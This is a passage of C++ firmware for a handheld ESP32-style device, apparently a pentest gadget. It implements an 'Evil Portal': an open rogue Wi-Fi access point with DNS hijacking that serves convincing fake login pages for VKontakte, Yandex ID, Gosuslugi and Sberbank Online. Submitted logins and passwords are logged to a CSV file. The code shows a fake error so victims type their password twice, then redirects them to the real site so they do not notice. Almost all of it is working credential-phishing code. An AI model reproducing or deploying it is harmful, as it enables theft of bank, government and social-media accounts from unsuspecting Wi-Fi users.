// ===================================================================
// bySaw Evil Portal
//
// Open rogue AP + DNS catch-all + credential-harvesting captive portal.
// Selection screen on entry (UP/DN + SEL). 4 built-in RU templates +
// up to 8 SD files from /evil_portal/*.html.
//
// Capture flow: first POST → "неверный пароль" → victim re-enters →
// second POST → redirect to real site. Both attempts logged to CSV.
// Template HTML uses {{ERR}} placeholder replaced at serve time.
// ===================================================================
#include "config.h"
#include "shared.h"
#include "EvilPortal.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>

extern TFT_eSPI tft;
extern bool feature_active;
extern bool feature_exit_requested;
bool featureExitButtonPressed();
bool isButtonPressed(int);
bool isButtonPressedEdge(int);
#ifndef BTN_UP
#define BTN_UP    6
#define BTN_DOWN  3
#define BTN_SELECT 7
#endif

namespace EvilPortal {

// ---------------------------------------------------------------
// Built-in templates (PROGMEM)
// {{ERR}} is replaced with CSS display value at serve time.
// Cyrillic encoded as UTF-8 hex so the source file stays 7-bit-safe.
// ---------------------------------------------------------------

// VKontakte
// \xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5
static const char kHtmlVK[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>\xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#e8ecf0;font-family:-apple-system,'Helvetica Neue',Arial,sans-serif;"
    "min-height:100vh;display:flex;flex-direction:column;align-items:center;"
    "justify-content:center;padding:16px}"
    ".logo{color:#2787f5;font-size:54px;font-weight:900;letter-spacing:-2px;margin-bottom:14px}"
    ".card{background:#fff;border-radius:8px;padding:28px 24px 22px;width:100%;max-width:360px;"
    "box-shadow:0 1px 4px rgba(0,0,0,.1),0 0 0 1px rgba(0,0,0,.04)}"
    "h1{font-size:20px;font-weight:600;color:#000;text-align:center;margin-bottom:4px}"
    ".sub{font-size:14px;color:#6d7885;text-align:center;margin-bottom:18px}"
    ".err{background:#fff0f0;border:1px solid #f5c6c6;border-radius:6px;padding:9px 12px;"
    "font-size:13px;color:#c0392b;margin-bottom:14px;display:{{ERR}}}"
    "input{width:100%;border:1.5px solid #d3d9de;border-radius:8px;padding:12px 14px;"
    "font-size:16px;margin-bottom:12px;outline:0;transition:border-color .15s}"
    "input:focus{border-color:#2787f5}"
    ".btn{width:100%;background:#2787f5;color:#fff;border:0;border-radius:8px;"
    "padding:13px;font-size:16px;font-weight:500;cursor:pointer}"
    ".btn:active{background:#1b6ad4}"
    ".foot{font-size:13px;color:#6d7885;text-align:center;margin-top:14px}"
    ".foot a{color:#2787f5;text-decoration:none}"
    ".sep{height:1px;background:#e8ecf0;margin:14px 0}"
    "</style></head><body>"
    "<div class='logo'>VK</div>"
    "<div class='card'>"
    "<h1>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</h1>"
    "<p class='sub'>\xd0\xb2 \xd0\xb0\xd0\xba\xd0\xba\xd0\xb0\xd1\x83\xd0\xbd\xd1\x82 \xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5</p>"
    "<div class='err'>\xd0\x9d\xd0\xb5\xd0\xb2\xd0\xb5\xd1\x80\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</div>"
    "<form method='POST' action='/login'>"
    "<input name='login' placeholder='\xd0\xa2\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 email' autocomplete='username' autofocus>"
    "<input name='password' type='password' placeholder='\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c' autocomplete='current-password'>"
    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
    "</form>"
    "<div class='foot' style='margin-top:12px'>"
    "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
    "</div>"
    "<div class='sep'></div>"
    "<div class='foot'>"
    "<a href='#'>\xd0\xa1\xd0\xbe\xd0\xb7\xd0\xb4\xd0\xb0\xd1\x82\xd1\x8c \xd0\xb0\xd0\xba\xd0\xba\xd0\xb0\xd1\x83\xd0\xbd\xd1\x82</a>"
    "</div>"
    "</div></body></html>";

// Yandex ID
// \xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81
static const char kHtmlYandex[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xe2\x80\x94 \xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81 ID</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#fff;font-family:'YS Text',Arial,sans-serif;"
    "min-height:100vh;display:flex;flex-direction:column;"
    "align-items:center;justify-content:center;padding:16px}"
    ".ya{font-size:28px;font-weight:700;color:#fc3f1d;margin-bottom:20px;"
    "display:flex;align-items:center;gap:8px}"
    ".ya span{color:#000}"
    ".card{border:1px solid #e0e0e0;border-radius:12px;padding:32px 28px;"
    "width:100%;max-width:380px}"
    "h1{font-size:22px;font-weight:700;color:#000;margin-bottom:6px}"
    ".sub{font-size:15px;color:#888;margin-bottom:22px}"
    ".err{background:#fef0f0;border:1px solid #f5c6c6;border-radius:8px;"
    "padding:10px 14px;font-size:14px;color:#d00;margin-bottom:16px;display:{{ERR}}}"
    "input{width:100%;border:1px solid #ccc;border-radius:8px;padding:14px 16px;"
    "font-size:16px;margin-bottom:14px;outline:0}"
    "input:focus{border-color:#000;box-shadow:0 0 0 2px rgba(0,0,0,.08)}"
    ".btn{width:100%;background:#ffdd2d;color:#000;border:0;border-radius:8px;"
    "padding:14px;font-size:16px;font-weight:700;cursor:pointer}"
    ".btn:active{background:#f0c800}"
    ".foot{font-size:13px;color:#999;text-align:center;margin-top:16px}"
    ".foot a{color:#000;text-decoration:underline}"
    "</style></head><body>"
    "<div class='ya'>\xd0\xaf<span>ndex</span></div>"
    "<div class='card'>"
    "<h1>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8 \xd0\xb2 \xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81</h1>"
    "<p class='sub'>\xd0\x98\xd1\x81\xd0\xbf\xd0\xbe\xd0\xbb\xd1\x8c\xd0\xb7\xd1\x83\xd0\xb9\xd1\x82\xd0\xb5 \xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81 ID</p>"
    "<div class='err'>\xd0\x9d\xd0\xb5\xd0\xb2\xd0\xb5\xd1\x80\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</div>"
    "<form method='POST' action='/login'>"
    "<input name='login' placeholder='\xd0\x9b\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd, \xd1\x82\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 email' autocomplete='username' autofocus>"
    "<input name='passwd' type='password' placeholder='\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c' autocomplete='current-password'>"
    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
    "</form>"
    "<div class='foot' style='margin-top:18px'>"
    "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
    " &nbsp;\xc2\xb7&nbsp; "
    "<a href='#'>\xd0\xa0\xd0\xb5\xd0\xb3\xd0\xb8\xd1\x81\xd1\x82\xd1\x80\xd0\xb0\xd1\x86\xd0\xb8\xd1\x8f</a>"
    "</div>"
    "</div></body></html>";

// Gosuslugi
// \xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8
static const char kHtmlGosuslugi[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8 \xe2\x80\x94 \xd0\x92\xd1\x85\xd0\xbe\xd0\xb4</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#f3f4f7;font-family:Arial,Helvetica,sans-serif}"
    "header{background:#0d4cd3;height:54px;display:flex;align-items:center;padding:0 20px}"
    ".hbrand{color:#fff;font-size:17px;font-weight:700;letter-spacing:-.3px}"
    ".htag{color:rgba(255,255,255,.65);font-size:11px;margin-left:6px;font-weight:400;"
    "text-transform:uppercase;letter-spacing:.5px}"
    ".wrap{max-width:420px;margin:32px auto;padding:0 16px}"
    ".card{background:#fff;border-radius:6px;overflow:hidden;"
    "box-shadow:0 1px 6px rgba(0,0,0,.09)}"
    ".card-hd{background:#0d4cd3;padding:18px 24px}"
    ".card-hd h2{color:#fff;font-size:18px;font-weight:700;margin-bottom:3px}"
    ".card-hd p{color:rgba(255,255,255,.75);font-size:13px}"
    ".card-bd{padding:22px 24px 24px}"
    ".tabs{display:flex;border-bottom:1px solid #e5e7eb;margin-bottom:20px}"
    ".tab{padding:8px 14px;font-size:13px;color:#6b7280;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}"
    ".tab.active{color:#0d4cd3;border-bottom-color:#0d4cd3;font-weight:600}"
    ".err{background:#fff5f5;border:1px solid #fca5a5;border-radius:4px;"
    "padding:10px 14px;font-size:14px;color:#dc2626;margin-bottom:16px;display:{{ERR}}}"
    "label{display:block;font-size:13px;color:#374151;font-weight:500;margin-bottom:5px}"
    "input{width:100%;border:1px solid #d1d5db;border-radius:4px;padding:11px 13px;"
    "font-size:15px;margin-bottom:16px;outline:0}"
    "input:focus{border-color:#0d4cd3;box-shadow:0 0 0 2px rgba(13,76,211,.12)}"
    ".btn{width:100%;background:#0d4cd3;color:#fff;border:0;border-radius:4px;"
    "padding:12px;font-size:15px;font-weight:600;cursor:pointer}"
    ".btn:active{background:#0b3fad}"
    ".note{font-size:12px;color:#9ca3af;text-align:center;margin-top:16px;line-height:1.5}"
    ".note a{color:#0d4cd3;text-decoration:none}"
    "</style></head><body>"
    "<header>"
    "<span class='hbrand'>\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8</span>"
    "<span class='htag'>\xd0\x95\xd0\xb4\xd0\xb8\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbf\xd0\xbe\xd1\x80\xd1\x82\xd0\xb0\xd0\xbb</span>"
    "</header>"
    "<div class='wrap'><div class='card'>"
    "<div class='card-hd'>"
    "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xbd\xd0\xb0 \xd0\xbf\xd0\xbe\xd1\x80\xd1\x82\xd0\xb0\xd0\xbb</h2>"
    "<p>\xd0\x92\xd0\xb2\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x82\xd0\xb5 \xd0\xb4\xd0\xb0\xd0\xbd\xd0\xbd\xd1\x8b\xd0\xb5 \xd1\x83\xd1\x87\xd1\x91\xd1\x82\xd0\xbd\xd0\xbe\xd0\xb9 \xd0\xb7\xd0\xb0\xd0\xbf\xd0\xb8\xd1\x81\xd0\xb8</p>"
    "</div>"
    "<div class='card-bd'>"
    "<div class='tabs'>"
    "<div class='tab active'>\xd0\x9f\xd0\xbe \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd\xd1\x83</div>"
    "<div class='tab'>\xd0\x9f\xd0\xbe \xd0\xa1\xd0\x9d\xd0\x98\xd0\x9b\xd0\xa1</div>"
    "<div class='tab'>QR</div>"
    "</div>"
    "<div class='err'>\xd0\x9d\xd0\xb5\xd0\xb2\xd0\xb5\xd1\x80\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</div>"
    "<form method='POST' action='/login'>"
    "<label>\xd0\xa2\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd, email \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xa1\xd0\x9d\xd0\x98\xd0\x9b\xd0\xa1</label>"
    "<input name='login' autocomplete='username' autofocus>"
    "<label>\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</label>"
    "<input name='password' type='password' autocomplete='current-password'>"
    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
    "</form>"
    "<p class='note'>"
    "\xd0\x97\xd0\xb0\xd1\x89\xd0\xb8\xd1\x89\xd1\x91\xd0\xbd\xd0\xbd\xd0\xbe\xd0\xb5 \xd1\x81\xd0\xbe\xd0\xb5\xd0\xb4\xd0\xb8\xd0\xbd\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5. "
    "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
    "</p>"
    "</div></div></div></body></html>";

// Sberbank Online
// \xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba
static const char kHtmlSberbank[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\x91\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#f5f5f5;font-family:Arial,Helvetica,sans-serif}"
    "header{background:#21a038;height:56px;display:flex;align-items:center;padding:0 20px;gap:10px}"
    ".hicon{width:32px;height:32px;background:#fff;border-radius:50%;"
    "display:flex;align-items:center;justify-content:center;"
    "font-size:17px;font-weight:900;color:#21a038;flex-shrink:0}"
    ".hname{color:#fff;font-size:16px;font-weight:700}"
    ".hsub{color:rgba(255,255,255,.7);font-size:11px}"
    ".wrap{max-width:400px;margin:32px auto;padding:0 16px}"
    ".card{background:#fff;border-radius:10px;overflow:hidden;"
    "box-shadow:0 2px 8px rgba(0,0,0,.08)}"
    ".card-hd{padding:20px 24px 16px;border-bottom:1px solid #f0f0f0}"
    ".card-hd h2{font-size:19px;font-weight:700;color:#1a1a1a;margin-bottom:3px}"
    ".card-hd p{font-size:13px;color:#888}"
    ".card-bd{padding:20px 24px 24px}"
    ".err{background:#fff0f0;border:1px solid #f5c6c6;border-radius:6px;"
    "padding:10px 14px;font-size:14px;color:#c0392b;margin-bottom:16px;display:{{ERR}}}"
    "label{display:block;font-size:13px;color:#555;font-weight:500;margin-bottom:5px}"
    "input{width:100%;border:1.5px solid #e0e0e0;border-radius:8px;padding:12px 14px;"
    "font-size:15px;margin-bottom:16px;outline:0;background:#fafafa}"
    "input:focus{border-color:#21a038;background:#fff;box-shadow:0 0 0 2px rgba(33,160,56,.1)}"
    ".btn{width:100%;background:#21a038;color:#fff;border:0;border-radius:8px;"
    "padding:13px;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:.2px}"
    ".btn:active{background:#1a8b2f}"
    ".note{font-size:12px;color:#aaa;text-align:center;margin-top:14px}"
    ".note a{color:#21a038;text-decoration:none}"
    "</style></head><body>"
    "<header>"
    "<div class='hicon'>\xd0\xa1</div>"
    "<div>"
    "<div class='hname'>\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\x91\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</div>"
    "<div class='hsub'>\xd0\x9b\xd0\xb8\xd1\x87\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xba\xd0\xb0\xd0\xb1\xd0\xb8\xd0\xbd\xd0\xb5\xd1\x82</div>"
    "</div>"
    "</header>"
    "<div class='wrap'><div class='card'>"
    "<div class='card-hd'>"
    "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xb2 \xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\x91\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</h2>"
    "<p>\xd0\x9c\xd0\xb0\xd0\xbd\xd0\xb0\xd0\xb3\xd0\xb5\xd0\xbc\xd0\xb5\xd0\xbd\xd1\x82 \xd1\x81\xd1\x87\xd0\xb5\xd1\x82\xd0\xbe\xd0\xb2 \xd0\xb8 \xd0\xba\xd0\xb0\xd1\x80\xd1\x82</p>"
    "</div>"
    "<div class='card-bd'>"
    "<div class='err'>\xd0\x9d\xd0\xb5\xd0\xb2\xd0\xb5\xd1\x80\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</div>"
    "<form method='POST' action='/login'>"
    "<label>\xd0\x9b\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd</label>"
    "<input name='login' placeholder='+7 \xe2\x80\x94 \xd1\x82\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd, \xd0\xb8\xd0\xbb\xd0\xb8 email' autocomplete='username' autofocus>"
    "<label>\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</label>"
    "<input name='password' type='password' autocomplete='current-password'>"
    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
    "</form>"
    "<p class='note'>"
    "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
    " \xe2\x80\x94 \xd0\xbf\xd0\xbe\xd0\xb7\xd0\xb2\xd0\xbe\xd0\xbd\xd0\xb8\xd1\x82\xd0\xb5 \xd0\xbd\xd0\xb0 900"
    "</p>"
    "</div></div></div></body></html>";

// ---------------------------------------------------------------
// Portal registry
// ---------------------------------------------------------------

struct Portal {
    const char *name;       // display name shown in selection UI (≤14 chars)
    const char *apSsid;     // broadcasted AP SSID
    const char *realUrl;    // redirect here after 2nd credential capture
    const char *html;       // PROGMEM ptr, nullptr for SD files
    char sdPath[48];
};

static const int MAX_PORTALS = 12;
static Portal s_portals[MAX_PORTALS];
static int s_portalCount = 0;

static void buildPortalList() {
    s_portalCount = 0;

    s_portals[s_portalCount++] = {
        "\xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5",
        "VK-WiFi", "https://vk.com", kHtmlVK, {}};
    s_portals[s_portalCount++] = {
        "\xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81 ID",
        "Yandex_WiFi", "https://yandex.ru", kHtmlYandex, {}};
    s_portals[s_portalCount++] = {
        "\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8",
        "Gosuslugi", "https://gosuslugi.ru", kHtmlGosuslugi, {}};
    s_portals[s_portalCount++] = {
        "\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba",
        "SberOnline", "https://online.sberbank.ru", kHtmlSberbank, {}};

    // scan SD /evil_portal/*.html
    if (SD.cardType() == CARD_NONE) return;
    SD.mkdir("/evil_portal");
    File dir = SD.open("/evil_portal");
    if (!dir) return;
    while (s_portalCount < MAX_PORTALS) {
        File f = dir.openNextFile();
        if (!f) break;
        const char *fn = f.name();
        int len = strlen(fn);
        if (len >= 5 && strcasecmp(fn + len - 5, ".html") == 0) {
            Portal &p = s_portals[s_portalCount++];
            strncpy(p.sdPath, "/evil_portal/", sizeof(p.sdPath) - 1);
            strncat(p.sdPath, fn, sizeof(p.sdPath) - 14 - 1);
            p.sdPath[sizeof(p.sdPath) - 1] = 0;
            static char nm[15];
            strncpy(nm, fn, 14); nm[14] = 0;
            char *dot = strrchr(nm, '.'); if (dot) *dot = 0;
            p.name    = nm;
            p.apSsid  = "Free WiFi";
            p.realUrl = "https://google.com";
            p.html    = nullptr;
        }
        f.close();
    }
    dir.close();
}

// ---------------------------------------------------------------
// Runtime state
// ---------------------------------------------------------------

static const byte DNS_PORT = 53;
static DNSServer  s_dns;
static WebServer  s_web(80);
static File       s_csv;
static bool       s_csvOpen      = false;
static String     s_template;    // raw HTML with {{ERR}} placeholder
static String     s_apIp;
static int        s_captured     = 0;
static int        s_hits         = 0;
static volatile bool s_dirty     = true;
static const char *s_portalName  = "";
static const char *s_activeApSsid= "";
static const char *s_realUrl     = "https://google.com";

// ---------------------------------------------------------------
// Template loader
// ---------------------------------------------------------------

static void loadTemplate(int idx) {
    s_template = "";
    if (idx < 0 || idx >= s_portalCount) return;
    const Portal &p = s_portals[idx];
    if (p.html) {
        const char *src = p.html;
        s_template.reserve(strlen_P(src) + 1);
        char c;
        while ((c = pgm_read_byte(src++))) s_template += c;
        Serial.printf("[evil] built-in: %s (%d bytes)\n", p.name, s_template.length());
    } else {
        File f = SD.open(p.sdPath, FILE_READ);
        if (f) {
            size_t sz = f.size();
            if (sz > 24576) sz = 24576;
            s_template.reserve(sz + 1);
            while (f.available() && s_template.length() < sz) s_template += (char)f.read();
            f.close();
            Serial.printf("[evil] SD: %s (%d bytes)\n", p.sdPath, s_template.length());
        }
    }
}

// ---------------------------------------------------------------
// Web handlers
// ---------------------------------------------------------------

static void servePortal(bool showError) {
    String page = s_template;
    page.replace("{{ERR}}", showError ? "block" : "none");
    s_web.send(200, "text/html; charset=utf-8", page);
}

static void handleRoot() {
    s_hits++;
    s_dirty = true;
    bool err = s_web.hasArg("err");
    servePortal(err);
}

static void handleRedirect() {
    s_web.sendHeader("Location", "http://" + s_apIp + "/", true);
    s_web.send(302, "text/plain", "");
}

static void handleLogin() {
    // collect and log credentials
    String rec = "";
    for (int i = 0; i < s_web.args(); i++) {
        if (i) rec += " | ";
        rec += s_web.argName(i) + "=" + s_web.arg(i);
    }
    Serial.printf("[evil] CAPTURED #%d: %s\n", s_captured + 1, rec.c_str());
    if (s_csvOpen) {
        s_csv.printf("%lu,%d,%s\n", (unsigned long)(millis() / 1000), s_captured + 1, rec.c_str());
        s_csv.flush();
    }
    s_captured++;
    s_dirty = true;

    if (s_captured < 2) {
        // first attempt: show "wrong password" — victim will re-enter
        s_web.sendHeader("Location", "http://" + s_apIp + "/?err=1", true);
        s_web.send(302, "text/plain", "");
    } else {
        // second attempt: redirect to real site — victim thinks they succeeded
        s_web.sendHeader("Location", s_realUrl, true);
        s_web.send(302, "text/plain", "");
    }
}

// ---------------------------------------------------------------
// Display: running portal status
// ---------------------------------------------------------------

static void drawRunning() {
    tft.fillScreen(UI_BG);
    tft.setTextFont(1);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 8, 1);

    tft.setTextSize(1);
    int y = 44;
    tft.setTextColor(UI_TEXT, UI_BG);
    tft.setCursor(10, y); tft.printf("AP:   %s", s_activeApSsid); y += 16;
    tft.setCursor(10, y); tft.print("IP:   "); tft.print(s_apIp.c_str()); y += 16;
    tft.setCursor(10, y); tft.printf("Tmpl: %s", s_portalName); y += 22;

    tft.setTextColor(UI_OK, UI_BG);
    tft.setTextSize(2);
    tft.setCursor(10, y); tft.printf("Clients: %d", WiFi.softAPgetStationNum()); y += 26;
    tft.setCursor(10, y); tft.printf("Views:   %d", s_hits); y += 26;
    tft.setTextColor(UI_WARN, UI_BG);
    tft.setCursor(10, y); tft.printf("Creds:   %d", s_captured);

    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("SEL: exit", tft.width() / 2, tft.height() - 12, 1);
}

// ---------------------------------------------------------------
// Display: template selection screen
// ---------------------------------------------------------------

static void drawSelect(int sel) {
    tft.fillScreen(UI_BG);
    tft.setTextFont(1);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 6, 1);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("Choose template", tft.width() / 2, 26, 1);

    const int rowH = 28;
    const int top  = 42;
    const int visRows = (tft.height() - top - 18) / rowH;
    int start = 0;
    if (sel >= visRows) start = sel - visRows + 1;

    for (int i = start; i < s_portalCount && (i - start) < visRows; i++) {
        int y   = top + (i - start) * rowH;
        bool hi = (i == sel);
        tft.fillRect(0, y, tft.width(), rowH - 2, hi ? UI_ACCENT : UI_BG);
        tft.setTextColor(hi ? UI_BG : UI_TEXT, hi ? UI_ACCENT : UI_BG);
        tft.setTextSize(1);
        tft.setCursor(10, y + 6);
        tft.print(s_portals[i].name);
        tft.setTextColor(hi ? UI_BG : UI_DIM_TEXT, hi ? UI_ACCENT : UI_BG);
        tft.setCursor(10, y + 16);
        tft.print(s_portals[i].apSsid);
    }

    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("UP/DN: choose  SEL: launch", tft.width() / 2, tft.height() - 10, 1);
}

// ---------------------------------------------------------------
// run()
// ---------------------------------------------------------------

void run() {
    feature_exit_requested = false;
    feature_active = false;  // keep false during selection so SEL isn't eaten as exit

    pauseBackgroundRadioTasks();
    buildPortalList();

    // --- selection screen ---
    int sel = 0;
    drawSelect(sel);
    bool launched = false;
    while (!feature_exit_requested) {
        if (isButtonPressedEdge(BTN_UP)) {
            if (sel > 0) { sel--; drawSelect(sel); }
            while (isButtonPressed(BTN_UP)) delay(10);
        }
        if (isButtonPressedEdge(BTN_DOWN)) {
            if (sel < s_portalCount - 1) { sel++; drawSelect(sel); }
            while (isButtonPressed(BTN_DOWN)) delay(10);
        }
        if (isButtonPressedEdge(BTN_SELECT)) {
            while (isButtonPressed(BTN_SELECT)) delay(10);
            launched = true;
            break;
        }
        delay(20);
    }

    if (!launched || feature_exit_requested) {
        Serial.println("[evil] cancelled at selection");
        return;
    }

    // --- launch portal ---
    feature_active     = true;
    setTouchButtonInputEnabled(true);  // enable touch SELECT slot for touch-only exit
    s_captured         = 0;
    s_hits             = 0;
    s_dirty            = true;
    s_portalName       = s_portals[sel].name;
    s_activeApSsid     = s_portals[sel].apSsid;
    s_realUrl          = s_portals[sel].realUrl;
    const char *apSsid = s_activeApSsid;

    tft.fillScreen(UI_BG);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 8, 1);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.setCursor(10, 40);
    tft.printf("Loading: %s", s_portalName);

    loadTemplate(sel);

    if (SD.cardType() != CARD_NONE) {
        SD.mkdir("/evil_portal");
        char path[52];
        snprintf(path, sizeof(path), "/evil_portal/creds-%lu.csv", (unsigned long)(millis() / 1000));
        s_csv = SD.open(path, FILE_WRITE);
        if (s_csv) {
            s_csvOpen = true;
            s_csv.print("uptime_s,attempt,fields\n");
            Serial.printf("[evil] log %s\n", path);
        }
    }

    WiFi.mode(WIFI_AP);
    WiFi.softAP(apSsid);
    delay(200);
    IPAddress ip = WiFi.softAPIP();
    s_apIp = ip.toString();
    s_dns.start(DNS_PORT, "*", ip);

    s_web.on("/", handleRoot);
    s_web.on("/login", HTTP_POST, handleLogin);
    s_web.on("/login", HTTP_GET,  handleRoot);
    s_web.on("/generate_204",        handleRedirect);
    s_web.on("/gen_204",             handleRedirect);
    s_web.on("/hotspot-detect.html", handleRoot);
    s_web.on("/ncsi.txt",            handleRedirect);
    s_web.on("/connecttest.txt",     handleRedirect);
    s_web.onNotFound(handleRoot);
    s_web.begin();
    Serial.printf("[evil] AP '%s' up at %s tmpl=%s\n", apSsid, ip.toString().c_str(), s_portalName);

    drawRunning();

    uint32_t lastDraw    = millis();
    int      lastClients = -1;
